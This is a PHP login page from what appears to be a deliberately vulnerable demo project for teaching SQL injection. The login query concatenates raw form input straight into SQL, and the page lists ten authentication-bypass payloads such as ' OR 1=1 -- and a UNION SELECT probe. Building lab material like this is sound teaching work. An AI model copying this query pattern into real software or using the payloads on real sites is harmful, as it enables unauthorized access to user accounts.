<?php 
require_once 'includes/config.php';

// If already logged in, redirect to dashboard
if(isset($_SESSION['user_id'])) {
    header('Location: dashboard.php');
    exit();
}

$error = '';
$success = '';

// ⚠️ VULNERABLE LOGIN (INTENTIONALLY INSECURE FOR PROJECT DEMO)
if($_SERVER['REQUEST_METHOD'] == 'POST') {
    $email = $_POST['email'];
    $password = $_POST['password'];
    
    // ⚠️ SQL Injection vulnerability (intentional)
    $query = "SELECT * FROM users WHERE email='$email' AND password='$password'";
    $result = mysqli_query($conn, $query);
    
    if($result && mysqli_num_rows($result) > 0) {
        $user = mysqli_fetch_assoc($result);
        
        // ⚠️ Insecure session handling (intentional for demo)
        $_SESSION['user_id'] = $user['id'];
        $_SESSION['username'] = $user['username'];
        $_SESSION['email'] = $user['email'];
        
        header('Location: dashboard.php');
        exit();
    } else {
        $error = 'Invalid credentials!';
    }
}

include 'includes/header.php'; 
?>

<div class="row justify-content-center mt-5">
    <div class="col-md-5">
        <div class="card">
            <div class="card-header">
                <h4 class="mb-0 text-white">
                    <i class="fas fa-sign-in-alt"></i> User Login (Vulnerable)
                </h4>
            </div>
            <div class="card-body">

                <?php if($error): ?>
                    <div class="alert alert-danger"><?php echo $error; ?></div>
                <?php endif; ?>
                
                <form method="POST" action="">
                    <div class="mb-3">
                        <label>Email Address</label>
                        <input type="text" class="form-control" name="email">
                    </div>

                    <div class="mb-3">
                        <label>Password</label>
                        <input type="password" class="form-control" name="password">
                    </div>

                    <button type="submit" class="btn btn-primary w-100">
                        Login
                    </button>
                </form>

                <div class="mt-3 text-center">
                    <p>Don't have an account? <a href="register.php">Register</a></p>
                </div>

                <!-- Normal Test User -->
                <div class="alert alert-info mt-3">
                    <strong>Normal Login:</strong><br>
                    Email: john@example.com<br>
                    Password: password123
                </div>

                <!-- SQL Injection Demo Section -->
                <div class="alert alert-warning mt-3">
                <i class="fas fa-bug"></i> <strong>SQL Injection Demo Payloads:</strong><br><br>

                <b>1️⃣ Basic Bypass</b><br>
                Email: <code>' OR 1=1 --</code><br>
                Password: anything<br><br>

                <b>2️⃣ Admin Bypass</b><br>
                Email: <code>admin@test.com' OR '1'='1' --</code><br>
                Password: anything<br><br>

                <b>3️⃣ Comment Style</b><br>
                Email: <code>' OR 1=1 #</code><br>
                Password: anything<br><br>

                <b>4️⃣ Quote Variation</b><br>
                Email: <code>' OR 'a'='a</code><br>
                Password: anything<br><br>

                <b>5️⃣ Existing User Bypass</b><br>
                Email: <code>john@example.com' --</code><br>
                Password: anything<br><br>

                <b>6️⃣ LIMIT Bypass</b><br>
                Email: <code>' OR 1=1 LIMIT 1 --</code><br>
                Password: anything<br><br>

                <b>7️⃣ UNION Test</b><br>
                Email: <code>' UNION SELECT 1,2,3 --</code><br>
                Password: anything<br><br>

                <b>8️⃣ Double Quote</b><br>
                Email: <code>" OR 1=1 --</code><br>
                Password: anything<br><br>

                <b>9️⃣ Bracket Bypass</b><br>
                Email: <code>') OR ('1'='1</code><br>
                Password: anything<br><br>

                <b>🔟 Email LIKE</b><br>
                Email: <code>' OR email LIKE '%@%'</code><br>
                Password: anything
                </div>

            </div>
        </div>
    </div>
</div>

<?php include 'includes/footer.php'; ?>
